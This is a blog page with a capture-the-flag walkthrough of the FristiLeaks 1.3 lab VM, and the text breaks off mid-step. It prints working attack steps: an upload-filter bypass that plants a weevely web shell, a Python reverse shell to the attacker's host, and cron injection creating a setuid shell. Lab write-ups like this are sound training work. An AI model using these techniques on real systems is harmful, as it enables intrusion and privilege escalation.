@@ -1,0 +1,822 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>FristiLeaks: 1.3 - 0x73696e65</title>
+  <meta name="author" content="Norbert Szetei">
+
+  
+  <meta name="description" content="Image: FristiLeaks: 1.3 Nmap output: 1
+2
+3
+4
+5
+6
+7
+8
+root@kali32:~$ sudo nmap 192.168.80.128 -sT -p- Starting Nmap 7.00 ( https://nmap.org ) at 2015- &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://73696e65.github.io/blog/2015/12/15/fristileaks-1-dot-3/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-64260520-1']);
+    _gaq.push(['_setDomainName','github.io']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body    class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">0x73696e65</a></h1>
+  
+    <h2>information security notes</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="73696e65.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">FristiLeaks: 1.3</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-15T08:45:49+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:45 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">FristiLeaks: 1.3</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ sudo nmap 192.168.80.128 -sT -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 7.00 ( https://nmap.org ) at 2015-12-14 23:16 CET
+</span><span class='line'>PORT   STATE SERVICE
+</span><span class='line'>80/tcp open  http
+</span><span class='line'>MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+</span><span class='line'>
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1055.59 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only http port is open. There is a <code>robots.txt</code> file with the following content:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /cola
+</span><span class='line'>Disallow: /sisi
+</span><span class='line'>Disallow: /beer</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing useful here, but our guess to try <code>/fristi</code> reveals in comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--</span>
+</span><span class='line'><span class="c">TODO:</span>
+</span><span class='line'><span class="c">We need to clean this up for production. I left some junk in here to make testing easier.</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">- by eezeepz</span>
+</span><span class='line'><span class="c">--&gt;</span>
+</span><span class='line'>...
+</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
+</span><span class='line'>jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
+</span><span class='line'>S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
+</span><span class='line'>B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
+</span><span class='line'>m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
+</span><span class='line'>Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
+</span><span class='line'>DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
+</span><span class='line'>jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
+</span><span class='line'>12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
+</span><span class='line'>uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
+</span><span class='line'>04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
+</span><span class='line'>i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
+</span><span class='line'>tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
+</span><span class='line'>30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
+</span><span class='line'>3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
+</span><span class='line'>ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
+</span><span class='line'>mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
+</span><span class='line'>rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
+</span><span class='line'>EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
+</span><span class='line'>AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
+</span><span class='line'>CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
+</span><span class='line'>U5ErkJggg==
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first hint was about username, the second one contains base64 encoded <code>png</code>
+file with the password. So we use them (<code>eezeepz / keKkeKKeKKeKkEkkEk</code>). Now we
+need to evade the image upload filtering.</p>
+
+<p>After trying different methods, finally we change for POST method the request for
+double extensions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;test.php.gif&quot;
+</span><span class='line'>
+</span><span class='line'>...
+</span><span class='line'><span class="nt">&lt;html&gt;</span>
+</span><span class='line'><span class="nt">&lt;body&gt;</span>
+</span><span class='line'>Uploading, please wait<span class="nt">&lt;br</span> <span class="nt">/&gt;</span>The file has been uploaded to /uploads <span class="nt">&lt;br</span> <span class="nt">/&gt;&lt;/body&gt;</span>
+</span><span class='line'><span class="nt">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The file that we uploaded was generated using <code>weevely</code> and after connecting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ weevely generate 1234 /tmp/test.php.gif
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ weevely http://192.168.80.128/fristi/uploads/test.php.gif 1234 id
+</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
+</span><span class='line'>
+</span><span class='line'>root@kali32:~$ weevely http://192.168.80.128/fristi/uploads/test.php.gif 1234</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We do a little investigation:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">localhost</span><span class="o">.</span><span class="nx">localdomain</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">fristi</span> <span class="err">$</span> <span class="nx">head</span> <span class="nx">checklogin</span><span class="o">.</span><span class="nx">php</span>
+</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">ob_start</span><span class="p">();</span>
+</span><span class='line'><span class="nv">$host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span> <span class="c1">// Host name</span>
+</span><span class='line'><span class="nv">$username</span><span class="o">=</span><span class="s2">&quot;eezeepz&quot;</span><span class="p">;</span> <span class="c1">// Mysql username</span>
+</span><span class='line'><span class="nv">$password</span><span class="o">=</span><span class="s2">&quot;4ll3maal12#&quot;</span><span class="p">;</span> <span class="c1">// Mysql password</span>
+</span><span class='line'><span class="nv">$db_name</span><span class="o">=</span><span class="s2">&quot;hackmenow&quot;</span><span class="p">;</span> <span class="c1">// Database name</span>
+</span><span class='line'><span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">&quot;members&quot;</span><span class="p">;</span> <span class="c1">// Table name</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Connect to server and select databse.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>localhost.localdomain:/var/www/html/fristi/uploads $ :audit_etcpasswd
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
+</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
+</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
+</span><span class='line'>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+</span><span class='line'>saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+</span><span class='line'>postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+</span><span class='line'>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+</span><span class='line'>apache:x:48:48:Apache:/var/www:/sbin/nologin
+</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+</span><span class='line'>vboxadd:x:498:1::/var/run/vboxadd:/bin/false
+</span><span class='line'>eezeepz:x:500:500::/home/eezeepz:/bin/bash
+</span><span class='line'>admin:x:501:501::/home/admin:/bin/bash
+</span><span class='line'>fristigod:x:502:502::/var/fristigod:/bin/bash
+</span><span class='line'>fristi:x:503:100::/var/www:/sbin/nologin</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>localhost.localdomain:/var/www/html/fristi/uploads $ :audit_suidsgid /
+</span><span class='line'>+----------------------------------+
+</span><span class='line'>| /bin/mount                       |
+</span><span class='line'>| /bin/fusermount                  |
+</span><span class='line'>| /bin/umount                      |
+</span><span class='line'>| /bin/su                          |
+</span><span class='line'>| /bin/ping                        |
+</span><span class='line'>| /bin/ping6                       |
+</span><span class='line'>| /sbin/netreport                  |
+</span><span class='line'>| /sbin/pam_timestamp_check        |
+</span><span class='line'>| /sbin/unix_chkpwd                |
+</span><span class='line'>| /usr/bin/crontab                 |
+</span><span class='line'>| /usr/bin/chsh                    |
+</span><span class='line'>| /usr/bin/sudo                    |
+</span><span class='line'>| /usr/bin/chfn                    |
+</span><span class='line'>| /usr/bin/write                   |
+</span><span class='line'>| /usr/bin/newgrp                  |
+</span><span class='line'>| /usr/bin/ssh-agent               |
+</span><span class='line'>| /usr/bin/chage                   |
+</span><span class='line'>| /usr/bin/gpasswd                 |
+</span><span class='line'>| /usr/bin/passwd                  |
+</span><span class='line'>| /usr/bin/wall                    |
+</span><span class='line'>| /usr/libexec/utempter/utempter   |
+</span><span class='line'>| /usr/libexec/openssh/ssh-keysign |
+</span><span class='line'>| /usr/libexec/pt_chown            |
+</span><span class='line'>| /usr/sbin/suexec                 |
+</span><span class='line'>| /usr/sbin/postqueue              |
+</span><span class='line'>| /usr/sbin/usernetctl             |
+</span><span class='line'>| /usr/sbin/postdrop               |
+</span><span class='line'>+----------------------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We use another python backdoor as reverse shell to redirect tty in python:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nc -l -p 1337
+</span><span class='line'>
+</span><span class='line'>weevely> python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1337</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the home directory of <code>eezeepz</code> user, there is <code>notes.txt</code> file with the instruction for cron:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat /home/eezeepz/notes.txt
+</span><span class='line'>cat /home/eezeepz/notes.txt
+</span><span class='line'>Yo EZ,
+</span><span class='line'>
+</span><span class='line'>I made it possible for you to do some automated checks,
+</span><span class='line'>but I did only allow you access to /usr/bin/* system binaries. I did
+</span><span class='line'>however copy a few extra often needed commands to my
+</span><span class='line'>homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
+</span><span class='line'>from /home/admin/
+</span><span class='line'>
+</span><span class='line'>Don't forget to specify the full path for each binary!
+</span><span class='line'>
+</span><span class='line'>Just put a file called "runthis" in /tmp/, each line one command. The
+</span><span class='line'>output goes to the file "cronresult" in /tmp/. It should
+</span><span class='line'>run every minute with my account privileges.
+</span><span class='line'>
+</span><span class='line'>- Jerry</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The escalation process is straightforward, we inject our code to execute shell
+and set suid permission using admin&rsquo;s account:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ echo '#include &lt;stdio.h>
+</span><span class='line'>#include &lt;stdlib.h>
+</span><span class='line'>#include &lt;sys/types.h>
+</span><span class='line'>#include &lt;unistd.h>
+</span><span class='line'>
+</span><span class='line'>int main()
+</span><span class='line'>{
+</span><span class='line'>   setreuid(geteuid(),geteuid());
+</span><span class='line'>   execve("/bin/sh", NULL, NULL);
+</span><span class='line'>
+</span><span class='line'>   return 0;
+</span><span class='line'>}
+</span><span class='line'>' > /tmp/run.cecho '#include &lt;stdio.h>
+</span><span class='line'>> #include &lt;stdlib.h>
+</span><span class='line'>> #include &lt;sys/types.h>
+</span><span class='line'>> #include &lt;unistd.h>
+</span><span class='line'>>
+</span><span class='line'>> int main()
+</span><span class='line'>> {
+</span><span class='line'>>    setreuid(geteuid(),geteuid());
+</span><span class='line'>>    execve("/bin/sh", NULL, NULL);
+</span><span class='line'>>
+</span><span class='line'>>    return 0;
+</span><span class='line'>> }
+</span><span class='line'>>
+</span><span class='line'>' > /tmp/run.c</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ gcc run.c -o run
+</span><span class='line'>gcc run.c -o run
+</span><span class='line'>
+</span><span class='line'>bash-4.1$ echo "/home/admin/cat /tmp/run > /tmp/run-admin" > /tmp/runthis
+</span><span class='line'>bash-4.1$ echo "/home/admin/chmod a+xs /tmp/run-admin" >> /tmp/runthis</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After the few seconds of waiting, we are <code>admin</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ ./run-admin
+</span><span class='line'>./run-admin
+</span><span class='line'>bash-4.1$ id
+</span><span class='line'>id
+</span><span class='line'>uid=501(admin) gid=48(apache) groups=48(apache)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We do some recon in admin directory, there is obfuscated password and encoding routine:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ cat whoisyourgodnow.txt
+</span><span class='line'>cat whoisyourgodnow.txt
+</span><span class='line'>=RFn0AKnlMHMPIzpyuTI0ITG</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">bash</span><span class="o">-</span><span class="mf">4.1</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">encodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">base64string</span><span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">base64string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;rot13&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">cryptoResult</span><span class="o">=</span><span class="n">encodeString</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'><span class="k">print</span> <span class="n">cryptoResult</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the password is at first base64 encoded, then reversed and shifted using rot13. We reverse the process in python:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
+</span><span class='line'><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;=RFn0AKnlMHMPIzpyuTI0ITG&#39;</span><span class="p">,</span> <span class="s">&#39;rot13&#39;</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
+</span><span class='line'><span class="s">&#39;LetThereBeFristi!&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found the password for <code>fristigod</code> user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bash-4.1$ su fristigod
+</span><span class='line'>su fristigod
+</span><span class='line'>Password: LetThereBeFristi!
+</span><span class='line'>
+</span><span class='line'>bash-4.1$ id
+</span><span class='line'>id
+</span><span class='line'>uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In his directory, there is a binary with the user authorization and
+<code>.bash_history</code> file, we use <code>sudo</code> the same way as previously invoked according the history file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
